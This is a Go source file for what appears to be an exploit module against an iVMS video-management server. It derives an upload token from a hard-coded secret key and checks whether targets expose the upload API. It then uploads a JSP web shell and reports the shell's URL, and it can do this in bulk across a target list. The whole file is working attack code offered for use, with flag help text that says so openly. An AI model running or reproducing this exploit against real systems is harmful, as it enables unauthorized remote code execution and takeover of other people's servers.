package modules

import (
	"bufio"
	"bytes"
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/go-resty/resty/v2"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

func (I *Ivms) init() {
	flag.StringVar(&I.target, "u", "", "target you want fuck.")
	flag.StringVar(&I.targetFile, "f", "", "targets you want fuck.")
	flag.StringVar(&I.shellFile, "s", "", "shell file you want upload.")
	flag.BoolVar(&I.upload, "e", false, "direct fuck targets.")
	flag.BoolVar(&I.check, "c", true, "check target vuln.(default)")
	flag.Parse()
	I.vuln = false
	if I.target != "" && I.targetFile != "" {
		log.Fatalln("just give single target with u parma or multi targets with parma f")
	}
	if I.targetFile != "" {
		I.loadTargetsFile()
	}
	if I.upload {
		if I.shellFile == "" {
			log.Fatalln("pls specific a shell file if you want upload.")
		}
	}
}
func (I *Ivms) loadTargetsFile() {
	file, err := os.OpenFile(I.targetFile, os.O_RDONLY, 0666)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ip := strings.TrimSpace(scanner.Text())
		if len(ip) == 0 {
			continue
		}
		I.targets = append(I.targets, ip)
	}
}
func (I *Ivms) checkVul() {
	headers := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"}
	body := map[string]string{"service": I.target + "/home/index.action"}
	client := resty.New()
	client.SetHeaders(headers)
	client.SetBaseURL(I.target)
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetTimeout(10 * time.Second)
	resp, err := client.R().SetBody(body).Post("/eps/api/resourceOperations/upload?token=" + I.md5hash())
	if err != nil {
		return
	}
	if resp.StatusCode() == http.StatusOK {
		I.vuln = true
	}
}
func (I *Ivms) md5hash() string {
	data := make([]byte, 0)
	if strings.HasSuffix(I.target, "/") {
		data = []byte(I.target + "eps/api/resourceOperations/uploadsecretKeyIbuilding")
	} else {
		data = []byte(I.target + "/eps/api/resourceOperations/uploadsecretKeyIbuilding")
	}
	md5Ctx := md5.New()
	md5Ctx.Write(data)
	cipherStr := md5Ctx.Sum(nil)
	return hex.EncodeToString(cipherStr)
}
func (I *Ivms) uploadShell() {
	headers := map[string]string{"User-Agent": "MicroMessenger", "Upgrade-Insecure-Requests": "1", "Cache-Control": "no-cache"}
	client := resty.New()
	client.SetHeaders(headers)
	client.SetBaseURL(I.target)
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetTimeout(10 * time.Second)
	client.SetProxy("http://127.0.0.1:8080")
	file, _ := os.ReadFile("./test.jsp")
	resp, err := client.R().SetFileReader("fileUploader", "test.jsp", bytes.NewReader(file)).Post("/eps/resourceOperations/upload.action")
	if err != nil {
		return
	}
	if strings.Contains(string(resp.Body()), "success") {
		if uuid := I.getUuid(resp.Body()); uuid != "" {
			I.shellPath = I.target + fmt.Sprintf("/eps/upload/%s.jsp\n", uuid)
		}

	}
}
func (I Ivms) getUuid(resp []byte) string {
	regx, _ := regexp.Compile(`Uuid":".*?"`)
	result := regx.FindString(string(resp))
	if result != "" {
		return strings.Split(result, "\"")[2]
	}
	return ""
}
func (I *Ivms) Single() {
	I.checkVul()
	if I.vuln {
		fmt.Printf("target %s is vuln\n", I.target)
	} else {
		fmt.Printf("target %s is secure\n", I.target)
		return
	}
	if I.upload {
		I.uploadShell()
		fmt.Printf("shell path %s\n", I.shellPath)
	}
}
func (I *Ivms) Multi() {
	for _, v := range I.targets {
		I.target = v
		I.checkVul()
		if I.vuln {
			fmt.Printf("target %s may have vuln\n", I.target)
			if I.upload {
				I.uploadShell()
				fmt.Printf("shell path %s\n", I.shellPath)
			}
		} else {
			fmt.Printf("target %s is secure or have some problem\n", I.target)
		}
	}
}
func (I *Ivms) Run() {
	I.init()
	if len(I.targets) != 0 {
		I.Multi()
	} else {
		I.Single()
	}
}
